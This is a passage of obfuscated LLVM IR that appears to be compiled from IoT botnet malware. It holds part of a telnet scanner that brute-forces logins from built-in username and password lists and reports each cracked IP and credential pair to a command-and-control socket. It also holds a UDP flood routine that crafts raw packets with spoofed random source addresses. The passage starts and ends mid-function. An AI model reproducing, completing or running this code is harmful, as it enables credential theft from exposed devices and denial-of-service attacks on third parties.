  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %973
  %975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %974, i32 0, i32 2
  store i8 0, i8* %975, align 8
  %976 = load i32, i32* %4, align 4
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %977
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %978, i32 0, i32 3
  store i8 1, i8* %979, align 1
  br label %1223

; <label>:980:                                    ; preds = %957
  %981 = load i32, i32* %4, align 4
  %982 = sext i32 %981 to i64
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %982
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %983, i32 0, i32 2
  store i8 9, i8* %984, align 8
  br label %1222

; <label>:985:                                    ; preds = %73
  %986 = load i32, i32* %4, align 4
  %987 = sext i32 %986 to i64
  %988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %987
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %988, i32 0, i32 0
  %990 = load i32, i32* %989, align 16
  %991 = call i64 @send(i32 %990, i8* getelementptr inbounds ([181 x i8], [181 x i8]* @.str.31, i32 0, i32 0), i64 207, i32 16384)
  %992 = icmp slt i64 %991, 0
  br i1 %992, label %993, label %1008

; <label>:993:                                    ; preds = %985
  %994 = load i32, i32* %4, align 4
  %995 = sext i32 %994 to i64
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %995
  %997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %996, i32 0, i32 0
  %998 = load i32, i32* %997, align 16
  %999 = call i32 @sclose(i32 %998)
  %1000 = load i32, i32* %4, align 4
  %1001 = sext i32 %1000 to i64
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1001
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1002, i32 0, i32 2
  store i8 0, i8* %1003, align 8
  %1004 = load i32, i32* %4, align 4
  %1005 = sext i32 %1004 to i64
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1005
  %1007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1006, i32 0, i32 3
  store i8 1, i8* %1007, align 1
  br label %1223

; <label>:1008:                                   ; preds = %985
  %1009 = load i32, i32* %4, align 4
  %1010 = sext i32 %1009 to i64
  %1011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1010
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1011, i32 0, i32 2
  store i8 10, i8* %1012, align 8
  br label %1222

; <label>:1013:                                   ; preds = %73
  %1014 = load i32, i32* %4, align 4
  %1015 = sext i32 %1014 to i64
  %1016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1015
  %1017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1016, i32 0, i32 0
  %1018 = load i32, i32* %1017, align 16
  %1019 = call i64 @send(i32 %1018, i8* getelementptr inbounds ([181 x i8], [181 x i8]* @.str.31, i32 0, i32 0), i64 207, i32 16384)
  %1020 = icmp slt i64 %1019, 0
  br i1 %1020, label %1021, label %1036

; <label>:1021:                                   ; preds = %1013
  %1022 = load i32, i32* %4, align 4
  %1023 = sext i32 %1022 to i64
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1023
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1024, i32 0, i32 0
  %1026 = load i32, i32* %1025, align 16
  %1027 = call i32 @sclose(i32 %1026)
  %1028 = load i32, i32* %4, align 4
  %1029 = sext i32 %1028 to i64
  %1030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1029
  %1031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1030, i32 0, i32 2
  store i8 0, i8* %1031, align 8
  %1032 = load i32, i32* %4, align 4
  %1033 = sext i32 %1032 to i64
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1033
  %1035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1034, i32 0, i32 3
  store i8 1, i8* %1035, align 1
  br label %1223

; <label>:1036:                                   ; preds = %1013
  %1037 = load i32, i32* %4, align 4
  %1038 = sext i32 %1037 to i64
  %1039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1038
  %1040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1039, i32 0, i32 2
  store i8 11, i8* %1040, align 8
  br label %1222

; <label>:1041:                                   ; preds = %73
  %1042 = load i32, i32* %4, align 4
  %1043 = sext i32 %1042 to i64
  %1044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1043
  %1045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1044, i32 0, i32 6
  %1046 = load i32, i32* %1045, align 4
  %1047 = icmp eq i32 %1046, 0
  br i1 %1047, label %1048, label %1054

; <label>:1048:                                   ; preds = %1041
  %1049 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1050 = load i32, i32* %4, align 4
  %1051 = sext i32 %1050 to i64
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1051
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1052, i32 0, i32 6
  store i32 %1049, i32* %1053, align 4
  br label %1054

; <label>:1054:                                   ; preds = %1048, %1041
  %1055 = load i32, i32* %4, align 4
  %1056 = sext i32 %1055 to i64
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1056
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1057, i32 0, i32 0
  %1059 = load i32, i32* %1058, align 16
  %1060 = load i32, i32* %4, align 4
  %1061 = sext i32 %1060 to i64
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1061
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1062, i32 0, i32 8
  %1064 = load i8*, i8** %1063, align 8
  %1065 = load i32, i32* %4, align 4
  %1066 = sext i32 %1065 to i64
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1066
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1067, i32 0, i32 7
  %1069 = load i16, i16* %1068, align 16
  %1070 = zext i16 %1069 to i32
  %1071 = call i32 @readUntil(i32 %1059, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.32, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1064, i32 1024, i32 %1070)
  %1072 = icmp ne i32 %1071, 0
  br i1 %1072, label %1073, label %1108

; <label>:1073:                                   ; preds = %1054
  %1074 = load i32, i32* %4, align 4
  %1075 = sext i32 %1074 to i64
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1075
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1076, i32 0, i32 6
  store i32 0, i32* %1077, align 4
  %1078 = load i32, i32* %4, align 4
  %1079 = sext i32 %1078 to i64
  %1080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1079
  %1081 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1080, i32 0, i32 7
  store i16 0, i16* %1081, align 16
  %1082 = load i32, i32* @mainCommSock, align 4
  %1083 = load i32, i32* %4, align 4
  %1084 = sext i32 %1083 to i64
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1084
  %1086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1085, i32 0, i32 1
  %1087 = bitcast i32* %1086 to %struct.in_addr*
  %1088 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1087, i32 0, i32 0
  %1089 = load i32, i32* %1088, align 4
  %1090 = call i8* @inet_ntoa(i32 %1089) #2
  %1091 = load i32, i32* %4, align 4
  %1092 = sext i32 %1091 to i64
  %1093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1092
  %1094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1093, i32 0, i32 4
  %1095 = load i8, i8* %1094, align 2
  %1096 = zext i8 %1095 to i64
  %1097 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %1096
  %1098 = load i8*, i8** %1097, align 8
  %1099 = load i32, i32* %4, align 4
  %1100 = sext i32 %1099 to i64
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1100
  %1102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1101, i32 0, i32 5
  %1103 = load i8, i8* %1102, align 1
  %1104 = zext i8 %1103 to i64
  %1105 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1104
  %1106 = load i8*, i8** %1105, align 8
  %1107 = call i32 (i32, i8*, ...) @sockprintf(i32 %1082, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.33, i32 0, i32 0), i8* %1090, i8* %1098, i8* %1106)
  br label %1223

; <label>:1108:                                   ; preds = %1054
  %1109 = load i32, i32* %4, align 4
  %1110 = sext i32 %1109 to i64
  %1111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1110
  %1112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1111, i32 0, i32 0
  %1113 = load i32, i32* %1112, align 16
  %1114 = load i32, i32* %4, align 4
  %1115 = sext i32 %1114 to i64
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1115
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1116, i32 0, i32 8
  %1118 = load i8*, i8** %1117, align 8
  %1119 = load i32, i32* %4, align 4
  %1120 = sext i32 %1119 to i64
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1120
  %1122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1121, i32 0, i32 7
  %1123 = load i16, i16* %1122, align 16
  %1124 = zext i16 %1123 to i32
  %1125 = call i32 @readUntil(i32 %1113, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1118, i32 1024, i32 %1124)
  %1126 = icmp ne i32 %1125, 0
  br i1 %1126, label %1127, label %1181

; <label>:1127:                                   ; preds = %1108
  %1128 = load i32, i32* %4, align 4
  %1129 = sext i32 %1128 to i64
  %1130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1129
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1130, i32 0, i32 6
  store i32 0, i32* %1131, align 4
  %1132 = load i32, i32* %4, align 4
  %1133 = sext i32 %1132 to i64
  %1134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1133
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1134, i32 0, i32 7
  store i16 0, i16* %1135, align 16
  %1136 = load i32, i32* @mainCommSock, align 4
  %1137 = load i32, i32* %4, align 4
  %1138 = sext i32 %1137 to i64
  %1139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1138
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1139, i32 0, i32 1
  %1141 = bitcast i32* %1140 to %struct.in_addr*
  %1142 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1141, i32 0, i32 0
  %1143 = load i32, i32* %1142, align 4
  %1144 = call i8* @inet_ntoa(i32 %1143) #2
  %1145 = load i32, i32* %4, align 4
  %1146 = sext i32 %1145 to i64
  %1147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1146
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1147, i32 0, i32 4
  %1149 = load i8, i8* %1148, align 2
  %1150 = zext i8 %1149 to i64
  %1151 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %1150
  %1152 = load i8*, i8** %1151, align 8
  %1153 = load i32, i32* %4, align 4
  %1154 = sext i32 %1153 to i64
  %1155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1154
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1155, i32 0, i32 5
  %1157 = load i8, i8* %1156, align 1
  %1158 = zext i8 %1157 to i64
  %1159 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1158
  %1160 = load i8*, i8** %1159, align 8
  %1161 = call i32 (i32, i8*, ...) @sockprintf(i32 %1136, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.33, i32 0, i32 0), i8* %1144, i8* %1152, i8* %1160)
  %1162 = load i32, i32* %4, align 4
  %1163 = sext i32 %1162 to i64
  %1164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1163
  %1165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1164, i32 0, i32 8
  %1166 = load i8*, i8** %1165, align 8
  call void @llvm.memset.p0i8.i64(i8* %1166, i8 0, i64 1024, i32 1, i1 false)
  %1167 = load i32, i32* %4, align 4
  %1168 = sext i32 %1167 to i64
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1168
  %1170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1169, i32 0, i32 0
  %1171 = load i32, i32* %1170, align 16
  %1172 = call i32 @sclose(i32 %1171)
  %1173 = load i32, i32* %4, align 4
  %1174 = sext i32 %1173 to i64
  %1175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1174
  %1176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1175, i32 0, i32 3
  store i8 1, i8* %1176, align 1
  %1177 = load i32, i32* %4, align 4
  %1178 = sext i32 %1177 to i64
  %1179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1178
  %1180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1179, i32 0, i32 2
  store i8 0, i8* %1180, align 8
  br label %1223

; <label>:1181:                                   ; preds = %1108
  %1182 = load i32, i32* %4, align 4
  %1183 = sext i32 %1182 to i64
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1183
  %1185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1184, i32 0, i32 8
  %1186 = load i8*, i8** %1185, align 8
  %1187 = call i64 @strlen(i8* %1186) #10
  %1188 = trunc i64 %1187 to i16
  %1189 = load i32, i32* %4, align 4
  %1190 = sext i32 %1189 to i64
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1190
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1191, i32 0, i32 7
  store i16 %1188, i16* %1192, align 16
  br label %1193

; <label>:1193:                                   ; preds = %1181
  br label %1194

; <label>:1194:                                   ; preds = %1193
  %1195 = load i32, i32* %4, align 4
  %1196 = sext i32 %1195 to i64
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1196
  %1198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1197, i32 0, i32 6
  %1199 = load i32, i32* %1198, align 4
  %1200 = sub i32 %1199, 1731160646
  %1201 = add i32 %1200, 30
  %1202 = add i32 %1201, 1731160646
  %1203 = add i32 %1199, 30
  %1204 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1205 = icmp ult i32 %1202, %1204
  br i1 %1205, label %1206, label %1221

; <label>:1206:                                   ; preds = %1194
  %1207 = load i32, i32* %4, align 4
  %1208 = sext i32 %1207 to i64
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1208
  %1210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1209, i32 0, i32 0
  %1211 = load i32, i32* %1210, align 16
  %1212 = call i32 @sclose(i32 %1211)
  %1213 = load i32, i32* %4, align 4
  %1214 = sext i32 %1213 to i64
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1214
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1215, i32 0, i32 2
  store i8 0, i8* %1216, align 8
  %1217 = load i32, i32* %4, align 4
  %1218 = sext i32 %1217 to i64
  %1219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1218
  %1220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1219, i32 0, i32 3
  store i8 1, i8* %1220, align 1
  br label %1221

; <label>:1221:                                   ; preds = %1206, %1194
  br label %1222

; <label>:1222:                                   ; preds = %1221, %1036, %1008, %980, %952, %928, %778, %714, %582, %518, %428, %245, %73
  br label %1223

; <label>:1223:                                   ; preds = %1222, %1127, %1073, %1021, %993, %965, %937, %884, %859, %831, %763, %740, %659, %645, %567, %544, %461, %343, %195, %151
  %1224 = load i32, i32* %4, align 4
  %1225 = sub i32 0, %1224
  %1226 = sub i32 0, 1
  %1227 = add i32 %1225, %1226
  %1228 = sub i32 0, %1227
  %1229 = add nsw i32 %1224, 1
  store i32 %1228, i32* %4, align 4
  br label %69

; <label>:1230:                                   ; preds = %69
  br label %67
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare i32 @time(...) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %320

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %117

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i32 0, i32 0))
  br label %320

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* %11, align 4
  %61 = add i32 %60, 411892890
  %62 = add i32 %61, 1
  %63 = sub i32 %62, 411892890
  %64 = add nsw i32 %60, 1
  %65 = sext i32 %63 to i64
  %66 = call noalias i8* @malloc(i64 %65) #2
  store i8* %66, i8** %16, align 8
  %67 = load i8*, i8** %16, align 8
  %68 = icmp eq i8* %67, null
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %59
  br label %320

; <label>:70:                                     ; preds = %59
  %71 = load i8*, i8** %16, align 8
  %72 = load i32, i32* %11, align 4
  %73 = sub i32 %72, -204079078
  %74 = add i32 %73, 1
  %75 = add i32 %74, -204079078
  %76 = add nsw i32 %72, 1
  %77 = sext i32 %75 to i64
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 %77, i32 1, i1 false)
  %78 = load i8*, i8** %16, align 8
  %79 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %78, i32 %79)
  %80 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %81 = load i32, i32* %9, align 4
  %82 = sub i32 0, %80
  %83 = sub i32 0, %81
  %84 = add i32 %82, %83
  %85 = sub i32 0, %84
  %86 = add nsw i32 %80, %81
  store i32 %85, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %87

; <label>:87:                                     ; preds = %110, %109, %70
  %88 = load i32, i32* %15, align 4
  %89 = load i8*, i8** %16, align 8
  %90 = load i32, i32* %11, align 4
  %91 = sext i32 %90 to i64
  %92 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %93 = call i64 @sendto(i32 %88, i8* %89, i64 %91, i32 0, %struct.sockaddr* %92, i32 16)
  %94 = load i32, i32* %18, align 4
  %95 = load i32, i32* %14, align 4
  %96 = icmp eq i32 %94, %95
  br i1 %96, label %97, label %110

; <label>:97:                                     ; preds = %87
  %98 = load i32, i32* %8, align 4
  %99 = icmp eq i32 %98, 0
  br i1 %99, label %100, label %104

; <label>:100:                                    ; preds = %97
  %101 = call i32 @rand_cmwc()
  %102 = trunc i32 %101 to i16
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %102, i16* %103, align 2
  br label %104

; <label>:104:                                    ; preds = %100, %97
  %105 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %106 = load i32, i32* %17, align 4
  %107 = icmp sgt i32 %105, %106
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %104
  br label %116

; <label>:109:                                    ; preds = %104
  store i32 0, i32* %18, align 4
  br label %87

; <label>:110:                                    ; preds = %87
  %111 = load i32, i32* %18, align 4
  %112 = add i32 %111, -1029092445
  %113 = add i32 %112, 1
  %114 = sub i32 %113, -1029092445
  %115 = add i32 %111, 1
  store i32 %114, i32* %18, align 4
  br label %87

; <label>:116:                                    ; preds = %108
  br label %320

; <label>:117:                                    ; preds = %46
  %118 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %118, i32* %19, align 4
  %119 = load i32, i32* %19, align 4
  %120 = icmp ne i32 %119, 0
  br i1 %120, label %124, label %121

; <label>:121:                                    ; preds = %117
  %122 = load i32, i32* @mainCommSock, align 4
  %123 = call i32 (i32, i8*, ...) @sockprintf(i32 %122, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i32 0, i32 0))
  br label %320

; <label>:124:                                    ; preds = %117
  store i32 1, i32* %20, align 4
  %125 = load i32, i32* %19, align 4
  %126 = bitcast i32* %20 to i8*
  %127 = call i32 @setsockopt(i32 %125, i32 0, i32 3, i8* %126, i32 4) #2
  %128 = icmp slt i32 %127, 0
  br i1 %128, label %129, label %132

; <label>:129:                                    ; preds = %124
  %130 = load i32, i32* @mainCommSock, align 4
  %131 = call i32 (i32, i8*, ...) @sockprintf(i32 %130, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.36, i32 0, i32 0))
  br label %320

; <label>:132:                                    ; preds = %124
  store i32 50, i32* %21, align 4
  br label %133

; <label>:133:                                    ; preds = %139, %132
  %134 = load i32, i32* %21, align 4
  %135 = sub i32 0, -1
  %136 = sub i32 %134, %135
  %137 = add nsw i32 %134, -1
  store i32 %136, i32* %21, align 4
  %138 = icmp ne i32 %134, 0
  br i1 %138, label %139, label %149

; <label>:139:                                    ; preds = %133
  %140 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %141 = call i32 @rand_cmwc()
  %142 = xor i32 %140, -1
  %143 = and i32 %141, %142
  %144 = xor i32 %141, -1
  %145 = and i32 %140, %144
  %146 = or i32 %143, %145
  %147 = xor i32 %140, %141
  call void @srand(i32 %146) #2
  %148 = call i32 @rand() #2
  call void @init_rand(i32 %148)
  br label %133

; <label>:149:                                    ; preds = %133
  %150 = load i32, i32* %10, align 4
  %151 = icmp eq i32 %150, 0
  br i1 %151, label %152, label %153

; <label>:152:                                    ; preds = %149
  store i32 0, i32* %22, align 4
  br label %174

; <label>:153:                                    ; preds = %149
  %154 = load i32, i32* %10, align 4
  %155 = sub i32 0, %154
  %156 = add i32 32, %155
  %157 = sub nsw i32 32, %154
  %158 = shl i32 1, %156
  %159 = sub i32 %158, -2090512543
  %160 = sub i32 %159, 1
  %161 = add i32 %160, -2090512543
  %162 = sub nsw i32 %158, 1
  %163 = xor i32 %161, -1
  %164 = and i32 -1653016421, %163
  %165 = xor i32 -1653016421, -1
  %166 = and i32 %161, %165
  %167 = xor i32 -1, -1
  %168 = and i32 %167, -1653016421
  %169 = and i32 -1, %165
  %170 = or i32 %164, %166
  %171 = or i32 %168, %169
  %172 = xor i32 %170, %171
  %173 = xor i32 %161, -1
  store i32 %172, i32* %22, align 4
  br label %174

; <label>:174:                                    ; preds = %153, %152
  %175 = load i32, i32* %11, align 4
  %176 = sext i32 %175 to i64
  %177 = sub i64 0, 28
  %178 = sub i64 0, %176
  %179 = add i64 %177, %178
  %180 = sub i64 0, %179
  %181 = add i64 28, %176
  %182 = call i8* @llvm.stacksave()
  store i8* %182, i8** %23, align 8
  %183 = alloca i8, i64 %180, align 16
  %184 = bitcast i8* %183 to %struct.iphdr*
  store %struct.iphdr* %184, %struct.iphdr** %24, align 8
  %185 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %186 = bitcast %struct.iphdr* %185 to i8*
  %187 = getelementptr i8, i8* %186, i64 20
  %188 = bitcast i8* %187 to %struct.udphdr*
  store %struct.udphdr* %188, %struct.udphdr** %25, align 8
  %189 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %190 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %191 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 4
  %193 = load i32, i32* %22, align 4
  %194 = call i32 @getRandomIP(i32 %193)
  %195 = call i32 @htonl(i32 %194) #13
  %196 = load i32, i32* %11, align 4
  %197 = sext i32 %196 to i64
  %198 = sub i64 0, %197
  %199 = sub i64 8, %198
  %200 = add i64 8, %197
  %201 = trunc i64 %199 to i32
  call void @makeIPPacket(%struct.iphdr* %189, i32 %192, i32 %195, i8 zeroext 17, i32 %201)
  %202 = load i32, i32* %11, align 4
  %203 = sext i32 %202 to i64
  %204 = sub i64 8, 9038616093047042449
  %205 = add i64 %204, %203
  %206 = add i64 %205, 9038616093047042449
  %207 = add i64 8, %203
  %208 = trunc i64 %206 to i16
  %209 = call zeroext i16 @htons(i16 zeroext %208) #13
  %210 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %211 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %210, i32 0, i32 0
  %212 = bitcast %union.anon.2* %211 to %struct.anon.3*
  %213 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %212, i32 0, i32 2
  store i16 %209, i16* %213, align 2
  %214 = call i32 @rand_cmwc()
  %215 = trunc i32 %214 to i16
  %216 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %217 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %216, i32 0, i32 0
  %218 = bitcast %union.anon.2* %217 to %struct.anon.3*
  %219 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %218, i32 0, i32 0
  store i16 %215, i16* %219, align 2
  %220 = load i32, i32* %8, align 4
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %222, label %224

; <label>:222:                                    ; preds = %174
  %223 = call i32 @rand_cmwc()
  br label %229

; <label>:224:                                    ; preds = %174
  %225 = load i32, i32* %8, align 4
  %226 = trunc i32 %225 to i16
  %227 = call zeroext i16 @htons(i16 zeroext %226) #13
  %228 = zext i16 %227 to i32
  br label %229

; <label>:229:                                    ; preds = %224, %222
  %230 = phi i32 [ %223, %222 ], [ %228, %224 ]
